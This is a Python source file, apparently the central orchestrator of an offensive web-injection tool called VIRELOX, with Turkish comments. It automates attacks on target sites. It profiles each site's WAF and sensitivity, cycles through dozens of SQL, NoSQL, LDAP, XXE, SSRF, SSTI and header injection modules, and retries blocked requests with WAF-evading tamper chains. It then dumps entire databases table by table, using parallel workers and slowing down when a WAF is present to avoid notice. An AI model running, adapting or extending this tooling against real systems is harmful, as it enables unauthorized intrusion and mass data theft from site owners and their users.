"""
virelox_injection_motor.py — VIRELOX v4.0 Merkezi Injection Orchestrator
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
65+ injection tipini koordine eden ana motor.

Sniper Mode (v4.1) geliştirmeleri:
  • HedefProfilleyici ile WAF/hız/hassasiyet profili → payload kalibrasyonu
  • ResponseValidator ile HTML/JS gürültü filtresi
  • ConsistencyChecker (3-sorgu) ile OOB/hash payload doğrulaması
  • Bulk-Fetch asenkron dump (tam_veritabani_dump_async)
  • Zayıf hedefe az payload / güçlü hedefe daha kapsamlı tarama

Mozilla Public License 2.0 — AltayHR Developers
"""

import concurrent.futures
from typing import Optional, List, Dict, Any


class InjectionMotor:
    """
    Tüm 65+ injection tipini koordine eden ana motor.
    virelox.py tarafından kullanılır.

    Sniper Mode parametreleri:
        sniper_mod  : True → hedefi önce profille, sonra kalibre et
        max_workers : Bulk-Fetch asenkron dump için thread sayısı
    """

    # Lazy-loaded injection motorları önbelleği
    _MOTORLAR: Dict[str, Any] = {}

    # Tam desteklenen tip listesi
    DESTEKLENEN_TIPLER = [
        # Temel SQL
        "error", "union", "boolean", "time", "stacked",
        # Genişletilmiş SQL
        "inline_query", "conditional_error", "heavy_query", "xml_extract",
        "json_extract", "piggyback", "nested_select", "case_when",
        "char_func", "file_read", "file_write", "procedure",
        "benchmark_blind", "decimal", "rowid",
        # HTTP Header
        "header",
        # Body
        "json", "xml", "graphql", "ssti",
        # Cookie / Form
        "cookie", "multipart", "hpp",
        # LDAP / NoSQL
        "ldap", "nosql", "orm",
        # XXE / SSRF / CSV Formula
        # BUG FIX: XXEInjection/SSRFInjection/CSVFormulaInjection sınıfları
        # zeka_sistemi/xxe_ssrf_injection.py'de tanımlıydı ama _motor_yukle()
        # bunları hiç yüklemiyordu — bu yüzden --xxe / --ssrf bayrakları ve
        # scan-all taraması bu tipleri sessizce atlıyordu (motor None dönüp
        # `continue` ediliyordu). Artık desteklenen tipler listesine ve
        # _motor_yukle()'ye eklendi (aşağıda).
        "xxe", "ssrf", "csv_formula",
        # OOB
        "oob", "dns_oob", "http_oob",
        # Second-order
        "second_order", "stored", "cmd_via_sql",
        # Encoding bypass
        "hex_encoding", "char_func_bypass", "double_url",
        "unicode_bypass", "comment_split", "base64",
        "case_mixing", "whitespace_bypass",
    ]

    def __init__(self, http_istemci, log_func=None, payload_log_func=None,
                 sniper_mod: bool = True, max_workers: int = 4):
        self.http = http_istemci
        self.log  = log_func  or (lambda m: None)
        self.plog = payload_log_func or log_func or (lambda m: None)
        self._ai_secici = None

        # ── Sniper Mode state ────────────────────────────────────────────
        self.sniper_mod  = sniper_mod
        self.max_workers = max_workers
        self._profil: Optional[Dict[str, Any]] = None   # hedef profil cache
        self._rv = None     # ResponseValidator (lazy)
        self._cc = None     # ConsistencyChecker (lazy)

    # ── Lazy motor yükleme ────────────────────────────────────────────────────

    def _motor_yukle(self, tip: str):
        """Bir injection motorunu lazy olarak yükle."""
        if tip in self._MOTORLAR:
            return self._MOTORLAR[tip]

        motor = None
        try:
            if tip in ("error", "union", "boolean", "time", "stacked"):
                from modüller.virelox_sql import SQLInjectionMotoru
                motor = SQLInjectionMotoru(self.http, self.log, self.plog)

            elif tip in ("inline_query", "conditional_error", "heavy_query",
                         "xml_extract", "json_extract", "piggyback",
                         "nested_select", "case_when", "char_func", "file_read",
                         "file_write", "procedure", "benchmark_blind",
                         "decimal", "rowid"):
                from zeka_sistemi.genisletilmis_sql_injection import TUM_SQL_INJECTION_TIPLERI
                sinif = TUM_SQL_INJECTION_TIPLERI.get(tip)
                if sinif:
                    motor = sinif(self.http, self.log, self.plog)

            elif tip == "header":
                from zeka_sistemi.header_injection import HeaderInjectionMotoru
                motor = HeaderInjectionMotoru(self.http, self.log, self.plog)

            elif tip == "json":
                from zeka_sistemi.json_xml_graphql_injection import JSONInjection
                motor = JSONInjection(self.http, self.log, self.plog)

            elif tip == "xml":
                from zeka_sistemi.json_xml_graphql_injection import XMLInjection
                motor = XMLInjection(self.http, self.log, self.plog)

            elif tip == "graphql":
                from zeka_sistemi.json_xml_graphql_injection import GraphQLInjection
                motor = GraphQLInjection(self.http, self.log, self.plog)

            elif tip == "ssti":
                from zeka_sistemi.json_xml_graphql_injection import SSTIInjection
                motor = SSTIInjection(self.http, self.log, self.plog)

            elif tip == "ldap":
                from zeka_sistemi.ldap_nosql_injection import LDAPInjection
                motor = LDAPInjection(self.http, self.log, self.plog)

            elif tip == "nosql":
                from zeka_sistemi.ldap_nosql_injection import NoSQLInjection
                motor = NoSQLInjection(self.http, self.log, self.plog)

            elif tip == "orm":
                from zeka_sistemi.ldap_nosql_injection import ORMInjection
                motor = ORMInjection(self.http, self.log, self.plog)

            elif tip == "xxe":
                # BUG FIX: was unwired — see DESTEKLENEN_TIPLER comment above.
                from zeka_sistemi.xxe_ssrf_injection import XXEInjection
                motor = XXEInjection(self.http, self.log, self.plog)

            elif tip == "ssrf":
                # BUG FIX: was unwired — see DESTEKLENEN_TIPLER comment above.
                from zeka_sistemi.xxe_ssrf_injection import SSRFInjection
                motor = SSRFInjection(self.http, self.log, self.plog)

            elif tip == "csv_formula":
                from zeka_sistemi.xxe_ssrf_injection import CSVFormulaInjection
                motor = CSVFormulaInjection(self.http, self.log, self.plog)

            elif tip in ("oob", "dns_oob"):
                from zeka_sistemi.oob_injection import DNSOOBInjection
                motor = DNSOOBInjection(self.http, self.log, self.plog)

            elif tip == "http_oob":
                from zeka_sistemi.oob_injection import HTTPOOBInjection
                motor = HTTPOOBInjection(self.http, self.log, self.plog)

            elif tip == "second_order":
                from zeka_sistemi.second_order_injection import SecondOrderInjection
                motor = SecondOrderInjection(self.http, self.log, self.plog)

            elif tip == "stored":
                from zeka_sistemi.second_order_injection import StoredInjection
                motor = StoredInjection(self.http, self.log, self.plog)

            elif tip == "cmd_via_sql":
                from zeka_sistemi.second_order_injection import CommandInjectionViaSql
                motor = CommandInjectionViaSql(self.http, self.log, self.plog)

            elif tip == "cookie":
                from zeka_sistemi.cookie_multipart_injection import CookieInjection
                motor = CookieInjection(self.http, self.log, self.plog)

            elif tip == "multipart":
                from zeka_sistemi.cookie_multipart_injection import MultipartInjection
                motor = MultipartInjection(self.http, self.log, self.plog)

            elif tip == "hpp":
                from zeka_sistemi.cookie_multipart_injection import HTTPParameterPollution
                motor = HTTPParameterPollution(self.http, self.log, self.plog)

            elif tip in ("hex_encoding", "char_func_bypass", "double_url",
                         "unicode_bypass", "comment_split", "base64",
                         "case_mixing", "whitespace_bypass"):
                from zeka_sistemi.encoding_bypass_injection import TUM_ENCODING_BYPASS
                sinif = TUM_ENCODING_BYPASS.get(tip)
                if sinif:
                    motor = sinif(self.http, self.log, self.plog)

        except ImportError as e:
            self.log(f"[MOTOR] {tip} yüklenemedi: {e}")

        if motor:
            self._MOTORLAR[tip] = motor
        return motor

    # ── Sniper Mode: Hedef Profil ─────────────────────────────────────────────

    def hedef_profili_al(self, url: str, param: str = "",
                         zorla_yenile: bool = False) -> Dict[str, Any]:
        """
        Hedefin WAF durumu, yanıt hızı ve SQLi hassasiyetini ölçer.
        Sonucu önbelleğe alır — aynı session içinde tekrar çağrılırsa
        yeni istek atmaz (zorla_yenile=True ile sıfırlanabilir).

        Profil motoru strateji ve payload miktarı kalibrasyonunda kullanır:
          hassasiyet=weak  → 20 payload, hızlı agresif tarama
          hassasiyet=medium → 50 payload, dengeli
          hassasiyet=strong → 120 payload, WAF bypass tamperlarıyla
        """
        if self._profil and not zorla_yenile:
            return self._profil

        self.log("[SNIPER] Hedef profillemesi başlatıldı...")
        try:
            from modüller.yanit_dogrulayici import HedefProfilleyici
            hp = HedefProfilleyici(self.http, log_func=self.log)
            self._profil = hp.profil_cikart(url, param, hizli_mod=True)
            self.log(f"[SNIPER] Profil: {self._profil.get('profil_aciklama','')}")
        except Exception as e:
            self.log(f"[SNIPER] Profil hatası: {e}")
            self._profil = {
                "hiz": "medium", "waf": False, "waf_adi": None,
                "hassasiyet": "medium", "hata_hassas": False,
                "oneri_strateji": ["error", "union", "boolean", "time"],
                "profil_aciklama": "Profil alınamadı — varsayılan",
                "ortalama_sure": 1.0,
            }
        return self._profil

    def _max_payload_sayisi(self, profil: Dict[str, Any]) -> int:
        """Profile göre maksimum payload sayısı döner."""
        h = profil.get("hassasiyet", "medium")
        if h == "weak":   return 20
        elif h == "medium": return 50
        return 120

    def _sniper_rv(self):
        """Lazy-load ResponseValidator."""
        if self._rv is None:
            try:
                from modüller.yanit_dogrulayici import ResponseValidator
                self._rv = ResponseValidator(log_func=self.log)
            except ImportError:
                pass
        return self._rv

    # ── AI Analizi ────────────────────────────────────────────────────────────

    def ai_analiz_et(self, url: str, post_data=None) -> list:
        """AIInjectionSecici ile öncelikli injection tiplerini belirle."""
        try:
            from zeka_sistemi.ai_injection_secici import AIInjectionSecici
            if self._ai_secici is None:
                self._ai_secici = AIInjectionSecici()
            y = self.http.get(url)
            icerik = getattr(y, "text", "") if y else ""
            headers = dict(getattr(y, "headers", {})) if y else {}
            return self._ai_secici.analiz_et(url, icerik, headers,
                                             profil=self._profil)
        except Exception as e:
            self.log(f"[AI] Analiz hatası: {e}")
            return [{"tip": t, "neden": "Varsayılan", "oncelik": 50}
                    for t in ("error", "union", "boolean", "time", "stacked")]

    # ── Tam tarama ────────────────────────────────────────────────────────────

    def tam_tara(self, url: str, param: str, post_data=None,
                 secili_tipler: list = None, mod: str = "fast") -> dict:
        """
        Tüm injection tiplerini veya seçili tipleri tara.
        mod='fast'     : ilk başarılıda dur
        mod='thorough' : tümünü dene

        Sniper Mode aktifse:
          1. Hedef önce profillenir (1–3 istek)
          2. Profil hassasiyetine göre taranacak tip listesi ve payload
             limiti ayarlanır — zayıf hedefe gereksiz binlerce payload
             atılmaz; güçlü/WAF'lı hedefe yeterli bypass seçenekleri denenir
          3. Her sonuç ResponseValidator'dan geçer — HTML/JS gürültüsü filtre
        """
        # ── Sniper: hedef profili ───────────────────────────────────────────
        if self.sniper_mod:
            profil = self.hedef_profili_al(url, param)
        else:
            profil = {"hassasiyet": "medium",
                      "oneri_strateji": self.DESTEKLENEN_TIPLER if secili_tipler is None else secili_tipler}

        # ── Taranacak tip listesi: öneri sırasına göre sırala ──────────────
        if secili_tipler:
            tipler = secili_tipler
        else:
            oneri = profil.get("oneri_strateji", [])
            temel = ["error", "union", "boolean", "time", "stacked"]
            # Önerilen tipler başa, kalanlar arkaya
            tipler_sirali = [t for t in oneri if t in temel]
            tipler_sirali += [t for t in temel if t not in tipler_sirali]
            # Sniper modunda hassasiyete göre limit
            if self.sniper_mod:
                _max = self._max_payload_sayisi(profil)
                self.log(f"[SNIPER] Hassasiyet={profil.get('hassasiyet','?')} "
                         f"→ {len(tipler_sirali)} tip, maks payload={_max}")
            tipler = tipler_sirali

        sonuclar = {}
        self.log(f"[MOTOR] {len(tipler)} injection tipi taranıyor (mod={mod})")

        for tip in tipler:
            motor = self._motor_yukle(tip)
            if not motor:
                continue

            self.log(f"[MOTOR] → {tip.upper()} taranıyor...")
            try:
                # Header injection özel akış
                if tip == "header":
                    sonuc = {"basarili": False}
                    bulgular = motor.tam_tara(url, post_data)
                    if bulgular:
                        sonuc = {"basarili": True, "bulgular": bulgular,
                                 "payload": bulgular[0].get("payload",""),
                                 "dbms": "SQL/Header", "detay": str(bulgular[0])}
                elif hasattr(motor, "test"):
                    # Standart .test() arayüzü (tüm ek injection motorları)
                    sonuc = motor.test(url, param, post_data)
                else:
                    # Motor test() desteklemiyor — atla
                    self.log(f"[MOTOR] {tip}: test() arayüzü yok — atlanıyor")
                    continue

                # ── WAF 403/429 sonrası akıllı tamper yeniden deneme ────
                # Yanıt kodu WAF engeli gösteriyorsa otomatik tamper seç
                # ve tek kez daha dene (SmartRetry).
                if (not sonuc.get("basarili") and
                        sonuc.get("durum_kodu", 0) in (403, 406, 429, 503) and
                        not sonuc.get("_smart_retry")):
                    self.log(f"[SMART-RETRY] {tip.upper()} WAF bloğu ({sonuc.get('durum_kodu')}) "
                             f"— tamper ile yeniden deneniyor...")
                    try:
                        from zeka_sistemi.pyload_havuzu.tamper_teknikleri import tamper_zinciri_uygula
                        if hasattr(motor, "tamper_ayarla"):
                            motor.tamper_ayarla(["space2comment", "randomcase", "hex2char"])
                        retry = motor.test(url, param, post_data) if hasattr(motor, "test") else {}
                        retry["_smart_retry"] = True
                        if retry.get("basarili"):
                            sonuc = retry
                            self.log(f"[SMART-RETRY] ✔ Tamper bypass başarılı!")
                    except Exception:
                        pass

                # ── Sniper: sonucu doğrula ──────────────────────────────
                if sonuc.get("basarili") and self.sniper_mod:
                    rv = self._sniper_rv()
                    if rv and not self._sniper_sonuc_dogrula(sonuc, rv):
                        self.log(f"[SNIPER] {tip.upper()} sonucu doğrulama başarısız — atlanıyor")
                        sonuc["basarili"] = False
                        sonuc["sniper_red"] = True

                sonuc["tip"] = tip
                sonuclar[tip] = sonuc

                if sonuc.get("basarili"):
                    self.log(f"[MOTOR] ✔ {tip.upper()} AÇIK!")
                    if mod == "fast":
                        return {"basarili": True, "aktif_tip": tip,
                                "sonuclar": sonuclar}
            except Exception as e:
                self.log(f"[MOTOR] {tip} hata: {e}")
                sonuclar[tip] = {"basarili": False, "tip": tip, "hata": str(e)}

        basarili = {t: s for t, s in sonuclar.items() if s.get("basarili")}
        return {
            "basarili":  bool(basarili),
            "aktif_tip": next(iter(basarili), None),
            "sonuclar":  sonuclar,
            "basarililar": list(basarili.keys()),
            "profil": profil if self.sniper_mod else {},
        }

    def _sniper_sonuc_dogrula(self, sonuc: dict, rv) -> bool:
        """
        Sniper modu için ek doğrulama — `basarili=True` dönen sonucun
        gerçekten geçerli bir SQLi bulgusunu yansıtıp yansıtmadığını
        kontrol eder.

        Doğrulama adımları:
          1. Payload string HTML tag içeriyorsa → red (HTML yansıması)
          2. Detay string HTML tag içeriyorsa → red
          3. DBMS bilgisi varsa → geçerli (hata tabanlı doğrulanmış)
          4. Payload var ama DBMS yoksa → nötr (boolean/time vb. — geçerli say)
        """
        payload = sonuc.get("payload", "") or ""
        detay   = sonuc.get("detay",   "") or ""
        dbms    = sonuc.get("dbms",    "") or ""

        # 1. Payload veya detay HTML içeriyorsa yansıma var → red
        import re
        _html = re.compile(r'<(?:script|html|div|body|form|input|span)[^>]*>', re.IGNORECASE)
        if _html.search(payload) or _html.search(detay[:200]):
            return False

        # 2. DBMS varsa hata tabanlı doğrulanmış
        if dbms and dbms != "SQL/Header":
            return True

        # 3. Payload var — boolean/time için geçerli say
        if payload:
            return True

        return False

    # ── Sniper Tarama (kolaylık metodu) ───────────────────────────────────────

    def sniper_tara(self, url: str, param: str, post_data=None) -> dict:
        """
        Sniper Mode ile hızlı tarama:
          1. Hedefi profille
          2. Hassasiyete göre kalibre et
          3. İlk başarılıda dur (fast mod)

        virelox.py'den doğrudan çağrılabilir.
        """
        return self.tam_tara(url, param, post_data=post_data,
                             mod="fast")

    # ── Header taraması ───────────────────────────────────────────────────────

    def header_tara(self, url: str, post_data=None) -> dict:
        motor = self._motor_yukle("header")
        if not motor:
            return {"basarili": False, "bulgular": []}
        bulgular = motor.tam_tara(url, post_data)
        return {"basarili": bool(bulgular), "bulgular": bulgular}

    # ── Dump ─────────────────────────────────────────────────────────────────

    def dump_et(self, url: str, param: str, injection_tipi: str,
                post_data=None, bulk_async: bool = True) -> dict:
        """
        Bulunan injection tipi üzerinden tam dump.

        bulk_async=True (varsayılan):
            tam_veritabani_dump_async() kullanır — tabloları paralel çeker.
            Büyük veritabanlarında sıralı dump'a kıyasla 3–6x hız kazancı.
        bulk_async=False:
            Eski sıralı tam_veritabani_dump() kullanır.
        """
        motor = self._motor_yukle(injection_tipi)
        if not motor:
            self.log(f"[MOTOR] {injection_tipi} motoru bulunamadı")
            return {}

        # Bulk-Fetch için SQLInjectionMotoru gerekli
        from modüller.virelox_sql import SQLInjectionMotoru
        if bulk_async and isinstance(motor, SQLInjectionMotoru):
            profil = self._profil or {}
            # WAF varsa worker sayısını kısıtla (hız yerine gizlilik öncelikli)
            if profil.get("waf"):
                workers = 1
            elif profil.get("hassasiyet") == "weak":
                workers = min(self.max_workers, 6)
            else:
                workers = min(self.max_workers, 3)

            self.log(f"[MOTOR] {injection_tipi.upper()} BULK-FETCH DUMP "
                     f"(workers={workers})...")
            try:
                return motor.tam_veritabani_dump_async(
                    url, param,
                    post_data=post_data,
                    log_func=self.log,
                    max_workers=workers,
                )
            except Exception as e:
                self.log(f"[MOTOR] Bulk dump hatası: {e} — sıralı dump'a geçiliyor")

        # Sıralı dump (fallback)
        self.log(f"[MOTOR] {injection_tipi.upper()} üzerinden sıralı dump başlatılıyor...")
        try:
            db = motor.mevcut_db_al(url, param, post_data) if hasattr(motor, "mevcut_db_al") else ""
            tablolar = motor.tablolari_al(url, param, db or "main", post_data) \
                if hasattr(motor, "tablolari_al") else []
            self.log(f"[MOTOR] DB={db}, {len(tablolar)} tablo")

            dump = {"veritabani": db, "tablolar": {}}
            for tablo in tablolar:
                kolonlar = motor.kolonlari_al(url, param, tablo, db, post_data) \
                    if hasattr(motor, "kolonlari_al") else []
                veriler = motor.tablo_verisi_cek(url, param, tablo, kolonlar, post_data) \
                    if hasattr(motor, "tablo_verisi_cek") else []
                dump["tablolar"][tablo] = {
                    "kolonlar": kolonlar,
                    "veriler":  veriler,
                    "satir_sayisi": len(veriler),
                }
                self.log(f"[MOTOR] ✔ {tablo}: {len(veriler)} satır")
            return dump
        except Exception as e:
            self.log(f"[MOTOR] Dump hatası: {e}")
            return {}

    # ── Desteklenen tipler ────────────────────────────────────────────────────

    def desteklenen_tipler(self) -> list:
        return list(self.DESTEKLENEN_TIPLER)
